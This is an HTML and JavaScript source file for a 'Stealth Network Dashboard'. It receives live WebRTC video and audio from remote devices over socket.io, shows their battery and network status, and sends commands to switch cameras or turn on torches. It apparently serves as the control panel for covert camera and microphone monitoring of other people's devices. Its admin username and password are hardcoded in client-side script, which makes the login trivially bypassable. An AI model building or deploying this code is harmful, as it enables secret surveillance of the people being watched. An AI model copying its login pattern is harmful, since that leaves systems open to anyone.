<!DOCTYPE html>
<html>
<head>
    <title>Pro Monitor Dashboard</title>
    <style>
        body { background: #111; color: white; font-family: sans-serif; text-align: center; margin: 0; }
        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
        .monitor-box { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
        .cam-container { width: 340px; background: #222; border-radius: 12px; border: 2px solid #444; padding: 10px; }
        video { width: 100%; border-radius: 8px; background: #000; }
        .info-panel { display: flex; justify-content: space-between; font-size: 11px; margin: 8px 0; color: #aaa; }
        .ctrl-btns { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; }
        button { padding: 10px 5px; font-size: 11px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; background: #333; }
        .btn-active { background: #f85606; }
        input[type=range] { width: 100%; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div id="login-overlay">
        <div style="background:#222; padding:30px; border-radius:10px; border:1px solid #f85606;">
            <h2>ğŸ”’ Admin Login</h2>
            <input type="text" id="user" placeholder="Username" style="padding:10px; margin:5px;"><br>
            <input type="password" id="pass" placeholder="Password" style="padding:10px; margin:5px;"><br>
            <button onclick="checkLogin()" style="background:#f85606; padding:10px 20px;">Access Monitor</button>
        </div>
    </div>

    <div id="monitor-ui" style="display:none;">
        <h2>ğŸ›°ï¸ Stealth Network Dashboard</h2>
        <div id="remote-videos" class="monitor-box"></div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const DB_USER = "admin", DB_PASS = "rony25";
        let socket, peers = {};

        function checkLogin() {
            if (document.getElementById("user").value === DB_USER && document.getElementById("pass").value === DB_PASS) {
                document.getElementById("login-overlay").style.display = "none";
                document.getElementById("monitor-ui").style.display = "block";
                initSocket();
            }
        }

        function initSocket() {
            socket = io();
            socket.on("offer-front", async (data) => {
                const { offer, senderId } = data;
                if (!peers[senderId]) createVideoBox(senderId);
                const pc = peers[senderId].pc;
                await pc.setRemoteDescription(new RTCSessionDescription(offer));
                const answer = await pc.createAnswer();
                await pc.setLocalDescription(answer);
                socket.emit("answer-front", { answer, to: senderId });
            });
            socket.on("status-update", (data) => {
                if (document.getElementById(`info-${data.id}`)) {
                    document.getElementById(`info-${data.id}`).innerHTML = `ğŸ”‹ ${data.battery}% | ${data.network}`;
                }
            });
            socket.on("user-disconnected", (id) => { if (peers[id]) document.getElementById(`container-${id}`).remove(); delete peers[id]; });
        }

        function createVideoBox(id) {
            const container = document.createElement("div");
            container.className = "cam-container"; container.id = `container-${id}`;
            container.innerHTML = `
                <video id="video-${id}" autoplay playsinline></video>
                <div class="info-panel" id="info-${id}">ğŸ”‹ --% | ğŸŒ Checking...</div>
                <div class="ctrl-btns">
                    <button class="btn-active" onclick="socket.emit('switch-camera', '${id}')">ğŸ”„ Switch</button>
                    <button onclick="socket.emit('toggle-torch', '${id}')">ğŸ’¡ Light</button>
                    <button id="mute-${id}" onclick="toggleMute('${id}')">ğŸ”Š Sound</button>
                </div>
                <input type="range" min="0" max="1" step="0.1" value="1" oninput="document.getElementById('video-${id}').volume = this.value">
            `;
            document.getElementById("remote-videos").appendChild(container);
            const pc = new RTCPeerConnection();
            pc.ontrack = (e) => { document.getElementById(`video-${id}`).srcObject = e.streams; };
            peers[id] = { pc };
        }

        function toggleMute(id) {
            const v = document.getElementById(`video-${id}`);
            v.muted = !v.muted;
            document.getElementById(`mute-${id}`).innerText = v.muted ? "ğŸ”‡ Muted" : "ğŸ”Š Sound";
        }
    </script>
</body>
</html>

